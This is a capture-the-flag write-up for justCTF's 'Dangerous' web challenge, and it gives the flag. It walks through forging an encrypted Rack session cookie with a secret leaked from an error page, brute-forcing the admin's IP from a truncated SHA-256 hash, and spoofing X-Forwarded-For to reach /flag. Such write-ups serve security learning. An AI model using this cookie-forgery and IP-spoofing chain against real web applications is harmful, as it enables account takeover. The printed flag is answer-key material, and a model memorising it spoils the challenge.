# Dangerous

## Flag
justCTF{1_th1nk_4l1ce_R4bb1t_m1ght_4_4_d0g}

## Solution

The web application has a `/flag` endpoint which shows the flag if the user is logged in with the correct username and the request is sent from the IP address defined in the file "config.json":

```Ruby
get "/flag" do
  if !session[:username] then
    erb :login
  elsif !is_allowed_ip(session[:username], request.ip, config) then
    return [403, "You are connecting from untrusted IP! #{request.ip}"]
  else
    return config["flag"] 
  end
end
```

```Ruby
def is_allowed_ip(username, ip, config)
  return config["mods"].any? {
    |mod| mod["username"] == username and mod["allowed_ip"] == ip
  }
end
```

The page shows an error page if a thread or a reply with empty content is created:
```Ruby
post "/thread" do
  if params[:content].nil? or params[:content] == "" then
    raise "Thread content cannot be empty!"
  end
  if session[:username] then
    username = is_allowed_ip(session[:username], request.ip, config) ? session[:username] : nil
  end
   con.execute("INSERT INTO threads (id, content, ip, username)
             VALUES (?, ?, ?, ?)", [nil, params[:content], request.ip, username])
  redirect to("/#{con.execute('SELECT last_insert_rowid()')[0][0]}")
end
```

We can use the error page for getting the type of cookies the web application is using and also the secret for forging the encrypted cookies.

We add the following lines of code to the "dangerous.rb" script for creating the cookies with the secret we obtained from the error page:

```Ruby
use Rack::Protection::EncryptedCookie,
                           :key => 'rack.session',
                           :path => '/',
                           :secret => 'a9316e61bc75029d52f915823d7bb628a4adae8b174bce89fd38ec4c7fb925a07e2ccbc01572b9fdce56502ef5d02609e5194a5ddd649ff349a206002e96a99d'
```

We can find the username of the admin by reading the titles of threads, which are "Admin:janitor" for the posts created by the admin, and we adapt our "config.json" file:
```
{
	"mods": [
		{
			"username": "janitor",
			"password": "password",
			"allowed_ip": "127.0.0.1"
		}
	],
	"flag": "testflag"
}
```
We create the cookie with the correct username by logging in locally. If we use that cookie on the challenge website, we get the message "You are connecting from untrusted IP!" and see
that the server has accepted the cookie we generated locally.

In the "thread.erb" file we see that a part of the SHA-256 hash of "IP_ADDRESS+THREAD_ID" is disclosed:

```HTML
			<% user_color = Digest::SHA256.hexdigest(reply[2] + @id).slice(0, 6) %>
			<div style="color: #<%= user_color %>;">
				<%= user_color %>
			<% if reply[3] %>
				<span style="color: #ff0000;">##Admin:<%= reply[3] %>##</span>
			<% end %>
			</div>
			<div><%= reply[1] %></div>
```

We use the values from the hashes of two threads for bruteforcing the IP address of the admin.


```Python
import ipaddress
from hashlib import sha256

i = 0
for ip in ipaddress.ip_network('0.0.0.0/0'):
   hash = sha256(str(ip).encode()+b'1').hexdigest()
   if hash[0:6]=='32cae2':
      hash = sha256(str(ip).encode()+b'2').hexdigest()
      if hash[0:6]=='92e1e8':
         print(ip)
   i += 1
   if i==100000:
      print("current ip: %s" %ip)
      i = 0
```

Then, we use `X-Forwarded-For: 10.24.170.69` for spoofing the IP address of the request on the `/flag` endpoint and get the flag.


